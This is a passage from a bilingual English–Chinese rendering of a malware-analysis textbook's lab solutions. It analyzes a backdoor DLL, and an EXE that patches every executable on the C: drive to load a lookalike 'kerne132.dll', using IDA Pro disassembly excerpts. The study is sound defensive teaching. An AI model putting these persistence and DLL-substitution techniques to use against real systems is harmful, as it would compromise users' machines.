  id: totrans-1929
  prefs: []
  type: TYPE_NORMAL
  zh: 10001010 _DllMain@12 proc near
- en: '10001010'
  id: totrans-1930
  prefs: []
  type: TYPE_NORMAL
  zh: '10001010'
- en: 10001010 hObject = dword ptr -11F8h
  id: totrans-1931
  prefs: []
  type: TYPE_NORMAL
  zh: 10001010 hObject = dword ptr -11F8h
- en: 10001010 name = sockaddr ptr -11F4h
  id: totrans-1932
  prefs: []
  type: TYPE_NORMAL
  zh: 10001010 name = sockaddr ptr -11F4h
- en: 10001010 ProcessInformation=_PROCESS_INFORMATION ptr -11E4h 10001010 StartupInfo
    = _STARTUPINFOA ptr -11D4h
  id: totrans-1933
  prefs: []
  type: TYPE_NORMAL
  zh: 10001010 ProcessInformation=_PROCESS_INFORMATION 指针 -11E4h 10001010 StartupInfo
    = _STARTUPINFOA 指针 -11D4h
- en: 10001010 WSAData = WSAData ptr -1190h
  id: totrans-1934
  prefs: []
  type: TYPE_NORMAL
  zh: 10001010 WSAData = WSAData 指针 -1190h
- en: 10001010 buf =  byte ptr -1000h
  id: totrans-1935
  prefs: []
  type: TYPE_NORMAL
  zh: 10001010 buf =  字节指针 -1000h
- en: 10001010 CommandLine =  byte ptr -0FFBh
  id: totrans-1936
  prefs: []
  type: TYPE_NORMAL
  zh: 10001010 CommandLine =  字节指针 -0FFBh
- en: 10001010 arg_4 = dword ptr 8
  id: totrans-1937
  prefs: []
  type: TYPE_NORMAL
  zh: 10001010 arg_4 = 双字指针 8
- en: Remember our receive buffer started at 0x1000 , and that this value is set
    using the lea instruction, which tells us that the data itself is stored on the
    stack, and is not just a pointer to the data. Also, the fact that 0x0FFB is 5
    bytes into our receive buffer tells us that the command to be executed is whatever
    is stored 5 bytes into our receive buffer. In this case, that means that the data
    received from the remote server would be exec *FullPathOfProgramToRun*. When the
    malware receives the exec *FullPathOfProgramToRun* command string from the remote
    server, it will call CreateProcessA with *FullPathOfProgramToRun*.
  id: totrans-1938
  prefs: []
  type: TYPE_NORMAL
  zh: 记住我们的接收缓冲区从 0x1000  开始，并且这个值是通过 lea 指令设置的，这告诉我们数据本身存储在堆栈上，而不仅仅是数据的指针。此外，0x0FFB
    是我们的接收缓冲区中的第 5 个字节，这告诉我们要执行的命令是存储在接收缓冲区第 5 个字节中的内容。在这种情况下，这意味着从远程服务器接收到的数据将是 exec
    *FullPathOfProgramToRun*。当恶意软件从远程服务器接收到 exec *FullPathOfProgramToRun* 命令字符串时，它将使用
    *FullPathOfProgramToRun* 调用 CreateProcessA。
- en: This brings us to the end of this function and DLL. We now know that this DLL
    implements backdoor functionality that allows the attacker to launch an executable
    on the system by sending a response to a packet on **524**
  id: totrans-1939
  prefs: []
  type: TYPE_NORMAL
  zh: 这就带我们来到了这个函数和 DLL 的结尾。我们现在知道这个 DLL 实现了后门功能，允许攻击者通过响应 **524** 的数据包在系统上启动可执行文件。
- en: Appendix C
  id: totrans-1940
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1941
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: port 80\. There’s still the mystery of why this DLL has no exported functions
    and how this DLL is run, and the content of the DLL offers no explanations, so
    we’ll need to defer those questions until later.
  id: totrans-1942
  prefs: []
  type: TYPE_NORMAL
  zh: 端口 80\. 仍然存在这个 DLL 没有导出函数的神秘之处以及这个 DLL 如何运行的问题，DLL 的内容也没有提供解释，因此我们需要将这些疑问留到以后再解决。
- en: '**Analyzing the EXE**'
  id: totrans-1943
  prefs: []
  type: TYPE_NORMAL
  zh: '**分析 EXE 文件**'
- en: Next, we navigate to the main method in the executable. One of the first things
    we see is a check for the command-line arguments, as shown in the following listing.
  id: totrans-1944
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们导航到可执行文件中的主方法。我们看到的第一件事是对命令行参数的检查，如下所示。
- en: 00401440 mov eax, [esp+argc]
  id: totrans-1945
  prefs: []
  type: TYPE_NORMAL
  zh: 00401440 将 eax 寄存器的值设置为 [esp+argc]
- en: 00401444 sub esp, 44h
  id: totrans-1946
  prefs: []
  type: TYPE_NORMAL
  zh: 00401444 将 esp 寄存器的值减去 44h
- en: 00401447 cmp eax, 2
  id: totrans-1947
  prefs: []
  type: TYPE_NORMAL
  zh: 00401447 cmp eax, 2
- en: '**7**'
  id: totrans-1948
  prefs: []
  type: TYPE_NORMAL
  zh: '**7**'
- en: 0040144A push ebx
  id: totrans-1949
  prefs: []
  type: TYPE_NORMAL
  zh: 0040144A 将 ebx 寄存器压入堆栈
- en: 0040144B push ebp
  id: totrans-1950
  prefs: []
  type: TYPE_NORMAL
  zh: 0040144B 将 ebp 寄存器压入堆栈
- en: 0040144C push esi
  id: totrans-1951
  prefs: []
  type: TYPE_NORMAL
  zh: 0040144C 将 esi 寄存器压入堆栈
- en: 0040144D push edi
  id: totrans-1952
  prefs: []
  type: TYPE_NORMAL
  zh: 0040144D 将 edi 寄存器压入堆栈
- en: 0040144E jnz loc_401813
  id: totrans-1953
  prefs: []
  type: TYPE_NORMAL
  zh: 0040144E jnz loc_401813
- en: 00401454 mov eax, [esp+54h+argv]
  id: totrans-1954
  prefs: []
  type: TYPE_NORMAL
  zh: 00401454 将 eax 寄存器的值设置为 [esp+54h+argv]
- en: 00401458 mov esi, offset aWarning_this_w ; "WARNING_THIS_WILL_DESTROY_YOUR_MACHINE"
  id: totrans-1955
  prefs: []
  type: TYPE_NORMAL
  zh: 00401458 将 esi 寄存器的值设置为 aWarning_this_w 的偏移量 ; "WARNING_THIS_WILL_DESTROY_YOUR_MACHINE"
- en: 0040145D mov eax, [eax+4]
  id: totrans-1956
  prefs: []
  type: TYPE_NORMAL
  zh: 0040145D 将 eax 寄存器的值设置为 [eax+4]
- en: '00401460 ; CODE XREF: _main+42 j 00401460 mov dl, [eax]'
  id: totrans-1957
  prefs: []
  type: TYPE_NORMAL
  zh: '00401460 ; CODE XREF: _main+42 j 00401460 mov dl, [eax]'
- en: 00401462 mov bl, [esi]
  id: totrans-1958
  prefs: []
  type: TYPE_NORMAL
  zh: 00401462 将 bl 寄存器的值设置为 [esi]
- en: 00401464 mov cl, dl
  id: totrans-1959
  prefs: []
  type: TYPE_NORMAL
  zh: 00401464 将 cl 寄存器的值设置为 dl
- en: 00401466 cmp dl, bl
  id: totrans-1960
  prefs: []
  type: TYPE_NORMAL
  zh: 00401466 比较 dl 和 bl
- en: 00401468 jnz short loc_401488
  id: totrans-1961
  prefs: []
  type: TYPE_NORMAL
  zh: 00401468 jnz short loc_401488
- en: 0040146A test cl, cl
  id: totrans-1962
  prefs: []
  type: TYPE_NORMAL
  zh: 0040146A 测试 cl 寄存器的值
- en: 0040146C jz short loc_401484
  id: totrans-1963
  prefs: []
  type: TYPE_NORMAL
  zh: 0040146C jz short loc_401484
- en: 0040146E mov dl, [eax+1]
  id: totrans-1964
  prefs: []
  type: TYPE_NORMAL
  zh: 0040146E 将 dl 寄存器的值设置为 [eax+1]
- en: 00401471 mov bl, [esi+1]
  id: totrans-1965
  prefs: []
  type: TYPE_NORMAL
  zh: 00401471 将 bl 寄存器的值设置为 [esi+1]
- en: 00401474 mov cl, dl
  id: totrans-1966
  prefs: []
  type: TYPE_NORMAL
  zh: 00401474 将 cl 寄存器的值设置为 dl
- en: 00401476 cmp dl, bl
  id: totrans-1967
  prefs: []
  type: TYPE_NORMAL
  zh: 00401476 比较 dl 和 bl
- en: 00401478 jnz short loc_401488
  id: totrans-1968
  prefs: []
  type: TYPE_NORMAL
  zh: 00401478 jnz short loc_401488
- en: 0040147A add eax, 2
  id: totrans-1969
  prefs: []
  type: TYPE_NORMAL
  zh: 0040147A 将 eax 寄存器的值加 2
- en: 0040147D add esi, 2
  id: totrans-1970
  prefs: []
  type: TYPE_NORMAL
  zh: 0040147D 添加 esi, 2
- en: 00401480 test cl, cl
  id: totrans-1971
  prefs: []
  type: TYPE_NORMAL
  zh: 00401480 测试 cl 寄存器的值
- en: 00401482 jnz short loc_401460
  id: totrans-1972
  prefs: []
  type: TYPE_NORMAL
  zh: 00401482 jnz short loc_401460
- en: '00401484 ; CODE XREF: _main+2C j 00401484 xor eax, eax'
  id: totrans-1973
  prefs: []
  type: TYPE_NORMAL
  zh: '00401484 ; CODE XREF: _main+2C j 00401484 xor eax, eax'
- en: 00401486 jmp short loc_40148D
  id: totrans-1974
  prefs: []
  type: TYPE_NORMAL
  zh: 00401486 短跳转 jmp short loc_40148D
- en: The first comparison at  checks to see if the argument count is 2\. If the
    argument count is not 2, the code jumps at  to another section of code, which
    prematurely exits. (This is what happened when we tried to perform dynamic analysis
    and the program ended quickly.) The program then moves argv[1] into EAX at  and
    the "WARNING_THIS_WILL_DESTROY_YOUR_MACHINE" string into ESI. The loop between
     and  compares the values stored in ESI and EAX. If they are not the same, the
    program jumps to a location that will return from this function without doing
    anything else.
  id: totrans-1975
  prefs: []
  type: TYPE_NORMAL
  zh: 第一次比较  检查参数计数是否为 2。如果参数计数不是 2，代码将跳转到  另一个代码段，并提前退出。（这就是我们尝试进行动态分析而程序快速结束的情况。）然后程序将
    argv[1] 移入 EAX 寄存器 ，并将 "WARNING_THIS_WILL_DESTROY_YOUR_MACHINE" 字符串移入 ESI 寄存器。在
     和  之间的循环比较 ESI 和 EAX 寄存器中存储的值。如果它们不相同，程序将跳转到不会执行其他操作而直接返回函数的位置。
- en: Solutions to Labs
  id: totrans-1976
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**525**'
  id: totrans-1977
  prefs: []
  type: TYPE_NORMAL
  zh: '**525**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1978
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'We’ve learned that this program exits immediately unless the correct parameters
    are specified on the command line. The correct usage of this program is as follows:'
  id: totrans-1979
  prefs: []
  type: TYPE_NORMAL
  zh: 我们了解到，除非在命令行上指定正确的参数，否则该程序会立即退出。此程序的正确用法如下：
- en: Lab07-03.exe WARNING_THIS_WILL_DESTROY_YOUR_MACHINE
  id: totrans-1980
  prefs: []
  type: TYPE_NORMAL
  zh: Lab07-03.exe WARNING_THIS_WILL_DESTROY_YOUR_MACHINE
- en: '**NOTE**'
  id: totrans-1981
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*Malware that has different behavior or requires command-line arguments is
    realistic,* *although this message is not. The arguments required by malware will
    normally be more* *cryptic. We chose to use this argument to ensure that you won’t
    accidentally run this on* *an important machine, because it can damage your computer
    and is difficult to remove.*'
  id: totrans-1982
  prefs: []
  type: TYPE_NORMAL
  zh: '*具有不同行为或需要命令行参数的恶意软件是现实的，* *尽管这个消息不是。恶意软件所需的参数通常会更* *晦涩。我们选择使用这个参数是为了确保您不会意外地在*
    *重要的机器上运行它，因为它可能会损坏您的计算机，并且难以删除.*'
- en: At this point, we could go back and redo our basic dynamic analysis and enter
    the correct parameters to get the program to execute more of its code, but to
    keep the momentum going, we’ll continue with the static analysis. If we get stuck,
    we can perform basic dynamic analysis.
  id: totrans-1983
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一点上，我们可以回到基本动态分析，重新输入正确的参数，让程序执行更多的代码，但为了保持势头，我们将继续进行静态分析。如果我们遇到困难，我们可以进行基本的动态分析。
- en: Continuing in IDA Pro, we see calls to CreateFile, CreateFileMapping, and MapViewOfFile
    where it opens *kernel32.dll* and our DLL *Lab07-03.dll*. Looking through this
    function, we see a lot of complicated reads and writes to memory. We could carefully
    analyze every instruction, but that would take too long, so let’s try looking
    at the function calls first.
  id: totrans-1984
  prefs: []
  type: TYPE_NORMAL
  zh: 在 IDA Pro 中继续分析，我们看到调用 CreateFile、CreateFileMapping 和 MapViewOfFile，它打开 *kernel32.dll*
    和我们的 DLL *Lab07-03.dll*。查看这个函数，我们看到很多复杂的内存读写操作。我们可以仔细分析每条指令，但这会花费太多时间，所以让我们先看看函数调用。
- en: 'We see two other function calls: sub_401040 and sub_401070\. Each of these
    functions is relatively short, and neither calls any other function. The functions
    are comparing memory, calculating offsets, or writing to memory.'
  id: totrans-1985
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还看到了两个其他函数调用：sub_401040 和 sub_401070\. 每个函数相对较短，并且没有调用其他函数。这些函数正在比较内存、计算偏移量或写入内存。
- en: Because we’re not trying to determine every last operation of the program, we
    can skip the tedious memory-operation functions. (Analyzing time-consuming functions
    like these is a common trap and should be avoided unless absolutely necessary.)
    We also see a lot of arithmetic, as well as memory movement and comparisons in
    this function, probably within the two open files ( *kernel32.dll* and *Lab07-03.dll*).
    The program is reading and writing the two open files. We could painstakingly
    track every instruction to see what changes are being made, but it’s much easier
    to skip over that for now and use dynamic analysis to observe how the files are
    accessed and modified.
  id: totrans-1986
  prefs: []
  type: TYPE_NORMAL
  zh: 因为我们不是试图确定程序的每一个操作，所以我们可以跳过繁琐的内存操作函数。（分析这些耗时函数是一个常见的陷阱，除非绝对必要，否则应避免。）我们还在这个函数中看到了很多算术运算，以及内存移动和比较，可能是在两个打开的文件（*kernel32.dll*
    和 *Lab07-03.dll*）中。程序正在读取和写入这两个打开的文件。我们可以仔细跟踪每条指令以查看发生了什么变化，但这样做现在会更简单，我们可以跳过这些细节，并使用动态分析来观察文件是如何被访问和修改的。
- en: Scrolling down in IDA Pro, we see more interesting code that calls Windows API
    functions. First, it calls CloseHandle on the two open files, so we know that
    the malware is finished editing those files. Then it calls CopyFile, which copies
    *Lab07-03.dll* and places it in *C:\Windows\System32\**kerne132.dll***, which
    is clearly meant to look like *kernel32.dll*. We can guess that ***kerne132.dll***
    will be used to run in place of *kernel32.dll*, but at this point, we don’t know
    how
  id: totrans-1987
  prefs: []
  type: TYPE_NORMAL
  zh: 在 IDA Pro 中向下滚动，我们看到更多有趣的代码，它调用了 Windows API 函数。首先，它调用 CloseHandle 关闭两个打开的文件，因此我们知道恶意软件已经完成了对这些文件的编辑。然后它调用
    CopyFile，将 *Lab07-03.dll* 复制到 *C:\Windows\System32\**kerne132.dll***，这显然是为了看起来像
    *kernel32.dll*。我们可以猜测 ***kerne132.dll*** 将被用来替代 *kernel32.dll* 运行，但到目前为止，我们不知道它是如何做到的
- en: '***kerne132.dll*** will be loaded.'
  id: totrans-1988
  prefs: []
  type: TYPE_NORMAL
  zh: '***kerne132.dll*** 将被加载。'
- en: 'The calls to CloseHandle and CopyFile tell us that this portion of code is
    complete, and the next section of code probably performs a separate logical task.
    We continue to look through the main method, and near the end, we see another
    function call that takes the string argument C:\\*, as follows: 00401806 push
    offset aC ; "C:\\*"'
  id: totrans-1989
  prefs: []
  type: TYPE_NORMAL
  zh: 调用CloseHandle和CopyFile告诉我们这部分代码已经完成，下一部分代码可能执行一个单独的逻辑任务。我们继续查看主方法，在接近末尾的地方，我们看到另一个函数调用，它接受字符串参数C:\\*，如下所示：00401806
    push offset aC ; "C:\\*"
- en: 0040180B call sub_4011E0
  id: totrans-1990
  prefs: []
  type: TYPE_NORMAL
  zh: 0040180B 调用 sub_4011E0
- en: '**526**'
  id: totrans-1991
  prefs: []
  type: TYPE_NORMAL
  zh: '**526**'
- en: Appendix C
  id: totrans-1992
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1993
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Unlike the other functions called by main, sub_4011E0 calls several other imported
    functions and looks interesting. Navigating to sub_4011E0, we would expect to
    see that IDA Pro has named the first argument to the function as arg_0, but it
    has labeled it lpFilename instead. It knows that it is a filename, because it
    is used as a parameter to a Windows API function that accepts a filename as a
    parameter. One of the first things this function does is call FindFirstFile on
    C:\\* to search the *C:* drive.
  id: totrans-1994
  prefs: []
  type: TYPE_NORMAL
  zh: 与main调用的其他函数不同，sub_4011E0调用了几个其他导入的函数，看起来很有趣。导航到sub_4011E0，我们预计IDA Pro会将函数的第一个参数命名为arg_0，但它将其标记为lpFilename。它知道它是一个文件名，因为它被用作接受文件名参数的Windows
    API函数的参数。这个函数做的第一件事就是调用C:\\*上的FindFirstFile来搜索*C:*驱动器。
- en: Following the call to FindFirstFile, we see a lot of arithmetic and comparisons.
    This is another tedious and time-consuming function that we should skip and return
    to only if we need more information later. The first call we see (other than malloc)
    is to sub_4011e0, the function that we’re currently analyzing, which tells us
    that this is a recursive function that calls itself. The next **7**
  id: totrans-1995
  prefs: []
  type: TYPE_NORMAL
  zh: 在调用FindFirstFile之后，我们看到大量的算术和比较操作。这是另一个既繁琐又耗时的函数，我们应该跳过它，除非我们以后需要更多信息。我们看到的第一个调用（除了malloc之外）是对sub_4011e0的调用，这是我们目前正在分析的函数，这告诉我们这是一个递归函数，它会调用自己。下一个**7**
- en: 'function called is stricmp at , as follows:'
  id: totrans-1996
  prefs: []
  type: TYPE_NORMAL
  zh: 被调用的函数是处的stricmp，如下所示：
- en: 004013F6
  id: totrans-1997
  prefs: []
  type: TYPE_NORMAL
  zh: 004013F6
- en: call ds:_stricmp
  id: totrans-1998
  prefs: []
  type: TYPE_NORMAL
  zh: 调用 ds:_stricmp
- en: 004013FC add esp, 0Ch
  id: totrans-1999
  prefs: []
  type: TYPE_NORMAL
  zh: 004013FC add esp, 0Ch
- en: 004013FF test eax, eax
  id: totrans-2000
  prefs: []
  type: TYPE_NORMAL
  zh: 004013FF test eax, eax
- en: 00401401 jnz short loc_40140C
  id: totrans-2001
  prefs: []
  type: TYPE_NORMAL
  zh: 00401401 jnz short loc_40140C
- en: 00401403 push ebp ; lpFileName 00401404
  id: totrans-2002
  prefs: []
  type: TYPE_NORMAL
  zh: 00401403 push ebp ; lpFileName 00401404
- en: call sub_4010A0
  id: totrans-2003
  prefs: []
  type: TYPE_NORMAL
  zh: 调用 sub_4010A0
- en: The arguments to the stricmp function are pushed onto the stack about 30 instructions
    before the function call, but you can still find them by looking for the most
    recent push instructions. The string comparison checks a string against .exe,
    and then it calls the function sub_4010a0 at  to see if they match.
  id: totrans-2004
  prefs: []
  type: TYPE_NORMAL
  zh: 在函数调用大约30条指令之前，stricmp函数的参数被压入堆栈，但您仍然可以通过查找最近的压入指令来找到它们。字符串比较检查一个字符串与.exe，然后它调用位于的函数sub_4010a0以查看它们是否匹配。
- en: We’ll finish reviewing this function before we see what sub_4010a0 does.
  id: totrans-2005
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将在查看sub_4010a0做什么之前完成对这个函数的审查。
- en: Digging further, we see a call to FindNextFileA, and then we see a jump call,
    which indicates that this functionality is performed in a loop. At the end of
    the function, FindClose is called, and then the function ends with some exception-handling
    code.
  id: totrans-2006
  prefs: []
  type: TYPE_NORMAL
  zh: 进一步挖掘，我们看到一个对FindNextFileA的调用，然后我们看到一个跳转调用，这表明这个功能是在循环中执行的。在函数的末尾，调用了FindClose，然后函数通过一些异常处理代码结束。
- en: At this point, we can say with high confidence that this function is searching
    the *C:* drive for *.exe* files and doing something if a file has an *.exe* extension.
  id: totrans-2007
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们可以有很高的信心说这个函数正在搜索*C:*驱动器上的*.exe*文件，并且如果文件有*.exe*扩展名，它将执行某些操作。
- en: The recursive call tells us that it’s probably searching the whole filesystem.
  id: totrans-2008
  prefs: []
  type: TYPE_NORMAL
  zh: 递归调用告诉我们它可能正在搜索整个文件系统。
- en: We could go back and verify the details to be sure, but this would take a long
    time. A much better approach is to perform the basic dynamic analysis with Process
    Monitor (procmon) to verify that it’s searching every directory for files ending
    in *.exe*.
  id: totrans-2009
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以回过头去验证细节以确保无误，但这会花费很长时间。一个更好的方法是使用Process Monitor（procmon）进行基本的动态分析，以验证它是否正在搜索每个以*.exe*结尾的目录中的文件。
- en: In order to see what this program is doing to *.exe* files, we need to analyze
    the function sub_4010a0, which is called when the *.exe* extension is found.
  id: totrans-2010
  prefs: []
  type: TYPE_NORMAL
  zh: 为了了解这个程序对*.exe*文件做了什么，我们需要分析当找到*.exe*扩展名时被调用的函数sub_4010a0。
- en: sub_4010a0 is a complex function that would take too long to analyze carefully.
  id: totrans-2011
  prefs: []
  type: TYPE_NORMAL
  zh: sub_4010a0是一个复杂的函数，仔细分析它将花费太长时间。
- en: Instead, we once again look only at the function calls. Here, we see that it
    first calls CreateFile, CreateFileMapping, and MapViewOfFile to map the entire
    file into memory. This tells us that the entire file is mapped into memory space,
    and the program can read or write the file without any additional function calls.
    This complicates analysis because it’s harder to tell how the file is being Solutions
    to Labs
  id: totrans-2012
  prefs: []
  type: TYPE_NORMAL
  zh: 相反，我们再次只关注函数调用。在这里，我们看到它首先调用了CreateFile、CreateFileMapping和MapViewOfFile来将整个文件映射到内存中。这告诉我们整个文件被映射到内存空间中，程序可以读取或写入文件而无需任何额外的函数调用。这使分析变得复杂，因为更难判断文件是如何被修改的。
- en: '**527**'
  id: totrans-2013
  prefs: []
  type: TYPE_NORMAL
  zh: '**527**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2014
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: modified. Again, we’ll just move quickly through this function and use dynamic
    analysis to see what changes are made to the file.
  id: totrans-2015
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将快速浏览这个函数，并使用动态分析来查看对文件所做的更改。
- en: Continuing to review the function, we see more arithmetic calls to IsBadPtr,
    which verify that the pointer is valid. Then we see a call to stricmp as shown
    at  in the following listing.
  id: totrans-2016
  prefs: []
  type: TYPE_NORMAL
  zh: 继续审查函数，我们看到更多的IsBadPtr算术调用，这些调用验证指针是否有效。然后我们看到一个与以下列表中所示的 stricmp调用。
- en: 0040116E push offset aKernel32_dll ; "kernel32.dll"
  id: totrans-2017
  prefs: []
  type: TYPE_NORMAL
  zh: 0040116E push offset aKernel32_dll ; "kernel32.dll"
- en: 00401173 push ebx ; char *
  id: totrans-2018
  prefs: []
  type: TYPE_NORMAL
  zh: 00401173 push ebx ; char *
- en: 00401174 call ds:_stricmp
  id: totrans-2019
  prefs: []
  type: TYPE_NORMAL
  zh: 00401174 call ds:_stricmp
- en: 0040117A add esp, 8
  id: totrans-2020
  prefs: []
  type: TYPE_NORMAL
  zh: 0040117A add esp, 8
- en: 0040117D test eax, eax
  id: totrans-2021
  prefs: []
  type: TYPE_NORMAL
  zh: 0040117D test eax, eax
- en: 0040117F jnz short loc_4011A7
  id: totrans-2022
  prefs: []
  type: TYPE_NORMAL
  zh: 0040117F jnz short loc_4011A7
- en: 00401181 mov edi, ebx
  id: totrans-2023
  prefs: []
  type: TYPE_NORMAL
  zh: 00401181 mov edi, ebx
- en: 00401183 or ecx, 0FFFFFFFFh
  id: totrans-2024
  prefs: []
  type: TYPE_NORMAL
  zh: 00401183 or ecx, 0FFFFFFFFh
- en: 00401186 repne scasb
  id: totrans-2025
  prefs: []
  type: TYPE_NORMAL
  zh: 00401186 repne scasb
- en: 00401188 not ecx
  id: totrans-2026
  prefs: []
  type: TYPE_NORMAL
  zh: 00401188 not ecx
- en: 0040118A mov eax, ecx
  id: totrans-2027
  prefs: []
  type: TYPE_NORMAL
  zh: 0040118A mov eax, ecx
- en: 0040118C mov esi, offset dword_403010
  id: totrans-2028
  prefs: []
  type: TYPE_NORMAL
  zh: 0040118C mov esi, offset dword_403010
- en: 00401191 mov edi, ebx
  id: totrans-2029
  prefs: []
  type: TYPE_NORMAL
  zh: 00401191 mov edi, ebx
- en: 00401193 shr ecx, 2
  id: totrans-2030
  prefs: []
  type: TYPE_NORMAL
  zh: 00401193 shr ecx, 2
- en: 00401196 rep movsd
  id: totrans-2031
  prefs: []
  type: TYPE_NORMAL
  zh: 00401196 rep movsd
- en: 00401198 mov ecx, eax
  id: totrans-2032
  prefs: []
  type: TYPE_NORMAL
  zh: 00401198 mov ecx, eax
- en: 0040119A and ecx, 3
  id: totrans-2033
  prefs: []
  type: TYPE_NORMAL
  zh: 0040119A and ecx, 3
- en: 0040119D rep movsb
  id: totrans-2034
  prefs: []
  type: TYPE_NORMAL
  zh: 0040119D rep movsb
- en: At this call to stricmp, the program checks for a string value of kernel32.dll
    at . A few instructions later, we see that the program calls repne scasb at 
  id: totrans-2035
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个stricmp调用中，程序检查字符串值kernel32.dll。几条指令后，我们看到程序调用了repne scasb。
- en: and rep movsd at , which are functionally equivalent to the strlen and memcpy
    functions. In order to see which memory address is being written by the memcpy
    call, we need to determine what’s stored in EDI, the register used by the rep
    movsd instruction. EDI is loaded with the value from EBX at , so we need to see
    where EBX is set.
  id: totrans-2036
  prefs: []
  type: TYPE_NORMAL
  zh: 以及处的rep movsd，它们在功能上等同于strlen和memcpy函数。为了看到memcpy调用写入哪个内存地址，我们需要确定EDI寄存器中存储的内容，该寄存器由rep
    movsd指令使用。EDI寄存器加载了EBX在处的值，因此我们需要查看EBX是如何设置的。
- en: We see that EBX is loaded with the value that we passed to stricmp at .
  id: totrans-2037
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到EBX寄存器加载了我们传递给stricmp的值。
- en: This means that if the function finds the string kernel32.dll, the code replaces
    it with something. To determine what it replaces that string with, we go to the
    rep movsd instruction and see that the source is at offset dword_403010\.
  id: totrans-2038
  prefs: []
  type: TYPE_NORMAL
  zh: 这意味着如果函数找到字符串kernel32.dll，代码会将其替换为其他内容。为了确定它用什么替换了这个字符串，我们转到rep movsd指令，并看到源地址是dword_403010偏移处。
- en: It doesn’t make sense for a DWORD value to overwrite a string of kernel32.dll,
    but it does make sense for one string value to overwrite another. The following
    listing shows what is stored at dword_403010\.
  id: totrans-2039
  prefs: []
  type: TYPE_NORMAL
  zh: DWORD值覆盖kernel32.dll字符串没有意义，但一个字符串值覆盖另一个字符串是有意义的。以下列表显示了dword_403010处存储的内容。
- en: '00403010 dword_403010 dd 6E72656Bh ; DATA XREF: 00403014 dword_403014 dd 32333165h
    ; DATA XREF: _main+1B9r 00403018 dword_403018 dd 6C6C642Eh ; DATA XREF: _main+1C2r
    0040301C dword_40301C dd 0 ; DATA XREF: _main+1CBr You should recognize that hex
    values beginning with 3, 4, 5, 6, or 7 are ASCII characters. IDA Pro has mislabeled
    our data. If we put the cursor on the same line as dword_403010 and press the
    A key on the keyboard, it will convert the data into the string **kerne132.dll**.'
  id: totrans-2040
  prefs: []
  type: TYPE_NORMAL
  zh: '00403010 dword_403010 dd 6E72656Bh ; DATA XREF: 00403014 dword_403014 dd 32333165h
    ; DATA XREF: _main+1B9r 00403018 dword_403018 dd 6C6C642Eh ; DATA XREF: _main+1C2r
    0040301C dword_40301C dd 0 ; DATA XREF: _main+1CBr 你应该知道以3、4、5、6或7开头的十六进制值是ASCII字符。IDA
    Pro错误地标记了我们的数据。如果我们把光标放在dword_403010同一行的位置，并按键盘上的A键，它将把数据转换为字符串**kerne132.dll**。'
- en: '**528**'
  id: totrans-2041
  prefs: []
  type: TYPE_NORMAL
  zh: '**528**'
- en: Appendix C
  id: totrans-2042
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2043
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Now we know that the executable searches through the filesystem for every file
    ending in *.exe*, finds a location in that file with the string kernel32.dll,
    and replaces it with **kerne132 *.*** **dll**. From our previous analysis, we
    know that *Lab07-03.dll* will be copied into *C:\Windows\System32* and named ***kerne132.dll***.
  id: totrans-2044
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道可执行文件会搜索文件系统中的每个以 *.exe* 结尾的文件，找到该文件中包含字符串 kernel32.dll 的位置，并将其替换为 **kerne132
    *.*** **dll**。根据我们之前的分析，我们知道 *Lab07-03.dll* 将被复制到 *C:\Windows\System32* 并命名为 ***kerne132.dll***。
- en: At this point, we can conclude that the malware modifies executables so that
    they access ***kerne132.dll*** instead of *kernel32.dll*. This indicates that
    ***kerne132.dll***
  id: totrans-2045
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们可以得出结论，恶意软件修改了可执行文件，使它们访问 ***kerne132.dll*** 而不是 *kernel32.dll*。这表明
    ***kerne132.dll***
- en: is loaded by executables that are modified to load ***kerne132.dll*** instead
    of *kernel32.dll*.
  id: totrans-2046
  prefs: []
  type: TYPE_NORMAL
  zh: 是由修改为加载 ***kerne132.dll*** 而不是 *kernel32.dll* 的可执行文件加载的。
- en: At this point, we’ve reached the end of the program and should be able to use
    dynamic analysis to fill in the gaps. We can use procmon to confirm that the program
    searches the filesystem for *.exe* files and then opens them.
  id: totrans-2047
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们已经到达了程序的末尾，应该能够使用动态分析来填补空白。我们可以使用 procmon 来确认程序搜索文件系统中的 *.exe* 文件，然后打开它们。
- en: (Procmon will show the program opening every executable on the system.) **7**
  id: totrans-2048
  prefs: []
  type: TYPE_NORMAL
  zh: （Procmon 将显示程序打开系统上的每个可执行文件。）**7**
- en: If we select an *.exe* file that has been opened and check the imports directory,
    we confirm that the imports from *kernel32.dll* have been replaced with imports
    from ***kerne132.dll***. This means that every executable on the system will attempt
    to load our malicious DLL—every single one.
  id: totrans-2049
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们选择一个已打开的 *.exe* 文件并检查导入目录，我们可以确认从 *kernel32.dll* 的导入已被从 ***kerne132.dll***
